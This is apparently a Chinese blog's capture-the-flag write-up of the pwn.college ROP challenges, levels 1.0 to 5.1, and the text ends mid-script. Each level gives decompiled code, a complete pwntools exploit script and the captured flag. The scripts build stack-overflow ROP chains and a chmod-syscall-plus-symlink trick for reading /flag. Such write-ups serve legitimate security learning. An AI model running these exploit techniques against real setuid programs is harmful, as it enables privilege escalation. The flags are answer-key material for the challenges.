---
title: "Write-ups: Program Security (Return Oriented Programming) series (Completed)"
published: 2025-01-19
updated: 2025-01-28
description: "Write-ups for pwn.college binary exploitation series."
tags: ["Pwn", "Write-ups", "ROP"]
category: "Write-ups"
draft: false
---

# 前言

我觉得应该珍惜现在的 ROP，Intel 近几年刚提出的 `CET (Control-flow Enforcement Technology)` 足以杀死绝大多数 ROP Exploit 了……以后 ROP 应该会更难一点，虽然不排除可能会出现新奇的绕过方式就是了 LOL

唉，算是经历了一个时代的变迁了吧？<s>_简单了解了一下 CET，靠，我要是早几年生我也可以想出来！！！_</s>就很感慨厉害的技术往往都是一些很简单的概念，却达到了非凡的效果，我也幻想自己可以研究点东西出来。

# Level 1.0

## Information

- Category: Pwn

## Description

> Overwrite a return address to trigger a win function!

## Write-up

怀着感慨和某种说不清的复杂的心情步入本章的第一题……

```c del={5, 34} collapse={1-1, 9-30, 38-40}
int __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  _QWORD v4[3]; // [rsp+0h] [rbp-60h] BYREF
  int v5; // [rsp+1Ch] [rbp-44h]
  _BYTE buf[60]; // [rsp+20h] [rbp-40h] BYREF
  int v7; // [rsp+5Ch] [rbp-4h]
  __int64 savedregs; // [rsp+60h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+68h] [rbp+8h] BYREF

  v5 = a1;
  v4[2] = a2;
  v4[1] = a3;
  puts(
    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
  sp_ = (__int64)v4;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v4) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("In this challenge, there is a win() function.");
  printf("win() will open the flag and send its data to stdout; it is at %p.\n", win);
  puts("In order to get the flag, you will need to call this function.\n");
  puts("You can call a function by directly overflowing into the saved return address,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_QWORD)buf);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_QWORD)buf + 8,
    57);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_QWORD)buf - 57);
  puts("and 8 that will overwrite the return address).");
  v7 = read(0, buf, 0x1000uLL);
  printf("Received %d bytes! This is potentially %d gadgets.\n", v7, (unsigned __int64)&buf[v7 - rp_] >> 3);
  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
  puts("from within this challenge. You will have to do that by yourself.");
  print_chain(rp_, (unsigned int)((unsigned __int64)&buf[v7 - rp_] >> 3) + 1);
  return puts("Leaving!");
}
```

很明显的栈溢出吧，然后我们希望执行 `win`：

```c
__uid_t win()
{
  int *v0; // rax
  char *v1; // rax
  __uid_t result; // eax
  int *v3; // rax
  char *v4; // rax

  puts("You win! Here is your flag:");
  flag_fd_23114 = open("/flag", 0);
  if ( flag_fd_23114 >= 0 )
  {
    flag_length_23115 = read(flag_fd_23114, &flag_23113, 0x100uLL);
    if ( flag_length_23115 > 0 )
    {
      write(1, &flag_23113, flag_length_23115);
      return puts("\n");
    }
    else
    {
      v3 = __errno_location();
      v4 = strerror(*v3);
      return printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
    }
  }
  else
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("\n  ERROR: Failed to open the flag -- %s!\n", v1);
    result = geteuid();
    if ( result )
    {
      puts("  Your effective user id is not 0!");
      return puts("  You must directly run the suid binary in order to have the correct permissions!");
    }
  }
  return result;
}
```

好吧，看来第一题比我想象中的要简单得多的多，可以说是没有任何限制条件，直接覆盖返回地址解决。~_就当是安慰我了 LMAO_~

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level1.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x48, b"A")
win_address = p64(0x401926)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_ret
    payload += win_address

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)
        target.recvall(timeout=3)
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{wpfRp_d39M4TTN2Q66mN_kfp0_g.0VM0MDL5cTNxgzW}`

# Level 1.1

## Information

- Category: Pwn

## Description

> Overwrite a return address to trigger a win function!

## Write-up

参见 [Level 1.0](#level-10)。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level1.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x68, b"A")
win_address = p64(0x401CAF)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_ret
    payload += win_address

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)
        target.recvall(timeout=3)
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{kIrK17VA4RSajTUwItMyNbaBDJw.0lM0MDL5cTNxgzW}`

# Level 2.0

## Information

- Category: Pwn

## Description

> Use ROP to trigger a two-stage win function!

## Write-up

```c del={34} collapse={1-30, 38-40}
int __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  _QWORD v4[3]; // [rsp+0h] [rbp-80h] BYREF
  int v5; // [rsp+1Ch] [rbp-64h]
  _BYTE buf[92]; // [rsp+20h] [rbp-60h] BYREF
  int v7; // [rsp+7Ch] [rbp-4h]
  __int64 savedregs; // [rsp+80h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+88h] [rbp+8h] BYREF

  v5 = a1;
  v4[2] = a2;
  v4[1] = a3;
  puts(
    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
  sp_ = (__int64)v4;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v4) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts(
    "In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.");
  puts("In order to get the flag, you will need to call all of these stages in order.\n");
  puts("You can call a function by directly overflowing into the saved return address,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_QWORD)buf);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_QWORD)buf + 8,
    79);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_QWORD)buf - 79);
  puts("and 8 that will overwrite the return address).");
  v7 = read(0, buf, 0x1000uLL);
  printf("Received %d bytes! This is potentially %d gadgets.\n", v7, (unsigned __int64)&buf[v7 - rp_] >> 3);
  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
  puts("from within this challenge. You will have to do that by yourself.");
  print_chain(rp_, (unsigned int)((unsigned __int64)&buf[v7 - rp_] >> 3) + 1);
  return puts("Leaving!");
}
```

~_真是经经又典典的开场啊，反汇编贴出来都是增加碳排放。_~

逆向发现有两个 `win` 函数：

```c
int win_stage_1()
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v2; // [rsp+114h] [rbp-Ch]
  int v3; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  fd = open("/flag", 0);
  v3 = lseek(fd, 0LL, 2) / 2 + 1;
  lseek(fd, 0LL, 0);
  v2 = read(fd, buf, v3);
  write(1, buf, v2);
  return close(fd);
}
```

```c
int win_stage_2()
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v2; // [rsp+114h] [rbp-Ch]
  int v3; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  fd = open("/flag", 0);
  v3 = lseek(fd, 0LL, 2) / 2 + 1;
  lseek(fd, v3, 0);
  v2 = read(fd, buf, v3);
  write(1, buf, v2);
  return close(fd);
}
```

`lseek` 函数用于修改文件指针位置，它的定义如下：

```c
// attributes: thunk
__off_t lseek(int fd, __off_t offset, int whence)
{
  return lseek(fd, offset, whence);
}
```

`fd` 是文件描述符、`offset` 是 `whence` 的偏移量、`whence` 决定了偏移的基准位置。执行成功返回新的文件偏移量，以字节为单位；失败则返回 `-1`，并设置 `errno` 表示错误原因。`whence` 有三个可选参数：`SEEK_SET (0)`、`SEEK_CUR (1)` 和 `SEEK_END (2)`，分别表示文件头、当前位置和文件末。

就以 `win_stage_1` 为例简单讲一下 `lseek` 在这里的作用：首先 `open` 返回了打开的文件描述符，`v3 = lseek(fd, 0LL, 2) / 2 + 1;` 做的是将 `fd` 的文件指针定位到文件末，返回了整个文件的大小，除以 2 相当于取这个文件的一半数据，然后加一，返回值保存到 `v3`。之后 `lseek(fd, 0LL, 0);` 又将文件指针指回文件头，`v2 = read(fd, buf, v3);` 做的是从 `fd` 读取 `v3` 字节数据到 `buf`，之后 `write(1, buf, v2);` 将 `buf` 中 `v2` 字节数据写入 `stdout`，所以整个函数就是做了一个读取文件一半加一字节内容并输出的工作。注意 `win_stage_1` 是读取前一半并输出，而 `win_stage_2` 是读取后一半并输出。

所以我们要做的很简单，就是构造 ROP Chain 依次执行这两个函数呗。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level2.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x68, b"A")
win_stage_1 = p64(0x401D66)
win_stage_2 = p64(0x401E13)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_ret
    payload += win_stage_1
    payload += win_stage_2

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)
        target.recvall(timeout=3)
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{4v7M0arrSE56nVZynPmA1hGzVcg.01M0MDL5cTNxgzW}`

# Level 2.1

## Information

- Category: Pwn

## Description

> Use ROP to trigger a two-stage win function!

## Write-up

参见 [Level 2.0](#level-20)。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level2.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x28, b"A")
win_stage_1 = p64(0x401F0F)
win_stage_2 = p64(0x401FBC)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    payload = padding_to_ret
    payload += win_stage_1
    payload += win_stage_2

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)
        target.recvall(timeout=3)
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        attack(target, payload)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{8i7RS4fxOytxYOpVidcCJE-hXqd.0FN0MDL5cTNxgzW}`

# Level 3.0

## Information

- Category: Pwn

## Description

> Use ROP to trigger a multi-stage win function!

## Write-up

为了保护环境，某些增加碳排放的东西我就不贴了，直接贴核心。

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_1(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 1 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, 0LL, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_2(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 2 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, v4, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_3(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 3 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, 2 * v4, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_4(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 4 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, 3 * v4, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

```c ins={8-9} collapse={1-4, 13-16}
int __fastcall win_stage_5(int a1)
{
  _BYTE buf[260]; // [rsp+10h] [rbp-110h] BYREF
  int v3; // [rsp+114h] [rbp-Ch]
  int v4; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  if ( a1 != 5 )
    return puts("Error: Incorrect value!");
  fd = open("/flag", 0);
  v4 = (int)lseek(fd, 0LL, 2) / 5 + 1;
  lseek(fd, 4 * v4, 0);
  v3 = read(fd, buf, v4);
  write(1, buf, v3);
  return close(fd);
}
```

这次分成了五个阶段输出，只要分别绕过这五个阶段的 `if` 即可。因为是 amd64 架构的，所以第一个参数通过 `rdi` 传递，我们直接找有关这个寄存器的 gadgets，发现：`0x402b53: pop rdi ; ret`，很好，这样的话我们先返回到这个 gadget，然后在它后面放绕过判断的参数，这个参数就会被 `pop` 到 `rdi`，之后再接函数地址就好了。

感觉这题也可以用 `D(ata)OP`，~_但是我一定不会告诉你我曾闲的蛋疼放着捷径不走试图绕远路，最后发现这条路是真 tm 远所以掉头回来走捷径的……_~

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, ROP, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level3.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *challenge+337
b *challenge+488
c
"""

padding_to_ret = b"".ljust(0x68, b"A")

win_stage_1 = p64(0x4023D9)
bypass_win_stage_1 = p64(0x1)
win_stage_2 = p64(0x402760)
bypass_win_stage_2 = p64(0x2)
win_stage_3 = p64(0x402598)
bypass_win_stage_3 = p64(0x3)
win_stage_4 = p64(0x40267A)
bypass_win_stage_4 = p64(0x4)
win_stage_5 = p64(0x4024B5)
bypass_win_stage_5 = p64(0x5)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address

    payload = padding_to_ret

    for i in range(1, 6):
        payload += p64(pop_rdi_ret)
        payload += globals()[f"bypass_win_stage_{i}"]
        payload += globals()[f"win_stage_{i}"]

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{EE8eEBP70ZX0reoW2Pp8YObscck.0VN0MDL5cTNxgzW}`

# Level 3.1

## Information

- Category: Pwn

## Description

> Use ROP to trigger a multi-stage win function!

## Write-up

参见 [Level 3.0](#level-30)。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, ROP, context, gdb, log, p64, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level3.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

padding_to_ret = b"".ljust(0x58, b"A")

win_stage_1 = p64(0x4015E3)
bypass_win_stage_1 = p64(0x1)
win_stage_2 = p64(0x40133A)
bypass_win_stage_2 = p64(0x2)
win_stage_3 = p64(0x4016BF)
bypass_win_stage_3 = p64(0x3)
win_stage_4 = p64(0x40141A)
bypass_win_stage_4 = p64(0x4)
win_stage_5 = p64(0x401500)
bypass_win_stage_5 = p64(0x5)


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address

    payload = padding_to_ret

    for i in range(1, 6):
        payload += p64(pop_rdi_ret)
        payload += globals()[f"bypass_win_stage_{i}"]
        payload += globals()[f"win_stage_{i}"]

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{o7dF6gbwKmwO-Xrdr1WGG5iKIQ-.0lN0MDL5cTNxgzW}`

# Level 4.0

## Information

- Category: Pwn

## Description

> Leverage a stack leak while crafting a ROP chain to obtain the flag!

## Write-up

这题就是自由 ROP 自由日了，感觉还是用 `chmod` 最简单，问题在于如何传递第一个参数 `const char *filename`。

嗯……自己构造 `/flag` 或者别的字符串未免也太麻烦了点，我们直接让 IDA 老婆看看程序本身有没有什么现成的好东西是我们可以直接利用的：

![](https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.8z6tmzp4ta.avif)

像这个 `ret` 看上去就很~清秀~了，我很喜欢～

说实话我感觉自己可能跑偏了，据说这题可以自己构造字符串，但是我太笨了没想出来怎么 leak stack……但是，你就说我这个方法是不是更简单吧 LMAO

> 刚打完 Level 7 的我敏锐的注意到了什么……既然 Level 7 是直接输出地址，那么……靠，Level 4 果然是把栈地址直接告诉我们了，但因为我没关注程序输出，so……好吧我本以为有什么神奇的构造字符串方法，那没事了，又结了一桩心头大患……

我日，为什么今天都 1.20 了，寒假过的真快，结束前能不能打完 FmtStr 都不好说了……

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    constants,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level4.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *challenge+396
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    padding_to_ret = b"".ljust(0x48, b"A")

    filename = next(elf.search(b"ret"))
    mode = 0o4

    pop_rdi_ret = rop.rdi.address
    pop_rsi_ret = rop.rsi.address
    pop_rax_ret = rop.rax.address
    syscall = rop.syscall.address

    payload = padding_to_ret
    payload += flat(
        pop_rdi_ret,
        filename,
        pop_rsi_ret,
        mode,
        pop_rax_ret,
        constants.SYS_chmod,
        syscall,
    )

    return payload


def attack(target, payload):
    try:
        os.system("ln -s /flag ret")

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{EXzWCvmQZIa9w6wrK_nx0PK1w3_.01N0MDL5cTNxgzW}`

# Level 4.1

## Information

- Category: Pwn

## Description

> Leverage a stack leak while crafting a ROP chain to obtain the flag!

## Write-up

参见 [Level 4.0](#level-40)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    constants,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level4.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    padding_to_ret = b"".ljust(0x78, b"A")

    filename = next(elf.search(b"###"))
    mode = 0o4

    pop_rdi_ret = rop.rdi.address
    pop_rsi_ret = rop.rsi.address
    pop_rax_ret = rop.rax.address
    syscall = rop.syscall.address

    payload = padding_to_ret
    payload += flat(
        pop_rdi_ret,
        filename,
        pop_rsi_ret,
        mode,
        pop_rax_ret,
        constants.SYS_chmod,
        syscall,
    )

    return payload


def attack(target, payload):
    try:
        os.system("ln -s /flag '###'")

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{g2fR-zCK75_60foo4wveIENcvF0.0FO0MDL5cTNxgzW}`

# Level 5.0

## Information

- Category: Pwn

## Description

> Craft a ROP chain to obtain the flag, now with no stack leak!

## Write-up

这题才应该用我在 [Level 4](#level-40) 用的方法吧，有时间我得好好研究下 Level 4 到底怎么泄漏地址了……

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    constants,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level5.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    padding_to_ret = b"".ljust(0x48, b"A")

    filename = next(elf.search(b"GNU"))
    mode = 0o4

    pop_rdi_ret = rop.rdi.address
    pop_rsi_ret = rop.rsi.address
    pop_rax_ret = rop.rax.address
    syscall = rop.syscall.address

    payload = padding_to_ret
    payload += flat(
        pop_rdi_ret,
        filename,
        pop_rsi_ret,
        mode,
        pop_rax_ret,
        constants.SYS_chmod,
        syscall,
    )

    return payload


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{sAqwz2eKPKj_t1zS9diA-_sbUf0.0VO0MDL5cTNxgzW}`

# Level 5.1

## Information

- Category: Pwn

## Description

> Craft a ROP chain to obtain the flag, now with no stack leak!

## Write-up

参见 [Level 5.0](#level-50)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    constants,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level5.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    padding_to_ret = b"".ljust(0x68, b"A")

    filename = next(elf.search(b"GNU"))
    mode = 0o4

    pop_rdi_ret = rop.rdi.address
    pop_rsi_ret = rop.rsi.address
    pop_rax_ret = rop.rax.address
    syscall = rop.syscall.address

    payload = padding_to_ret
    payload += flat(
        pop_rdi_ret,
        filename,
        pop_rsi_ret,
        mode,
        pop_rax_ret,
        constants.SYS_chmod,
        syscall,
    )

    return payload


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
